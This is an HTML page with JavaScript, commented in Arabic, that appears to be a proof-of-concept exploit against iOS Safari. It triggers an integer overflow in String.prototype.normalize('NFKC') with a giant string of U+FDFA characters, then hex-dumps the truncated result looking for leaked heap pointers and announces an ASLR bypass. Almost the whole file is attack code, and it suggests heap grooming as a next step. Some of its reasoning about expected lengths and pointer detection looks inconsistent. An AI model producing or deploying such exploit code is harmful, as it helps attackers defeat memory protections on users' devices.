<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iOS ASLR Bypass Test</title>
</head>
<body>
<button onclick="test()">تشغيل: iOS Info Leak (normalize)</button>
<pre id="log" style="white-space: pre-wrap; word-break: break-all;"></pre>
<script>
function log(m) {
    document.getElementById('log').textContent += m + '\n';
}

async function test() {
    log('=== iOS normalize() Integer Overflow Info Leak ===');

    const N = 238609295; // العدد الدقيق لـ Integer Overflow
    log('[*] محاولة إنشاء نص بحجم ' + N + ' حرف (~457MB)...');

    try {
        // إنشاء النص الضخم
        let str = '\uFDFA'.repeat(N);
        log('[+] تم إنشاء النص! الطول: ' + str.length);

        log('[*] استدعاء normalize("NFKC")... (هذا قد يستغرق ثواني)');
        
        // استدعاء الدالة التي تسبب التجاوز
        let result = str.normalize("NFKC");

        log('[+] normalize() عادت بنجاح!');
        log('[!] طول النتيجة: ' + result.length);

        // المتوقع: 14 (بسبب التجاوز العددي)
        if (result.length < 100 && result.length > 0) {
            log('[!!!] INTEGER OVERFLOW CONFIRMED!');
            log('[!!!] الطول المتوقع كان 4.3 مليار، حصلنا على: ' + result.length);
            log('[*] فحص البايتات المسربة (البحث عن مؤشرات)...');

            let hex = [];
            let suspicious = false;
            for (let i = 0; i < result.length; i++) {
                let code = result.charCodeAt(i);
                hex.push(code.toString(16).padStart(4, '0'));
                
                // مؤشرات iOS عادة تبدأ بـ 0x00000001 أو 0x000000016
                if (code > 0x1000) suspicious = true;
            }
            log('[!] Hex: ' + hex.join(' '));
            
            if (suspicious) {
                log('[★★★] LEAK DETECTED! ASLR BYPASSed on iOS!');
            } else {
                log('[-] القيم تبدو صفرية أو صغيرة، قد تحتاج لتهيئة الكومة (Heap Grooming)');
            }
        } else if (result.length === 0) {
            log('[-] النتيجة فارغة (ICU فشلت دون تجاوز)');
        } else {
            log('[-] النتيجة طويلة (' + result.length + ')، التجاوز لم يحدث.');
        }
    } catch (e) {
        log('[X] خطأ: ' + e.message);
        if (e.message.includes("OutOfMemory")) {
            log('[X] الجهاز لا يمتلك ذاكرة كافية لهذا النص.');
        }
    }
}
</script>
</body>
</html>
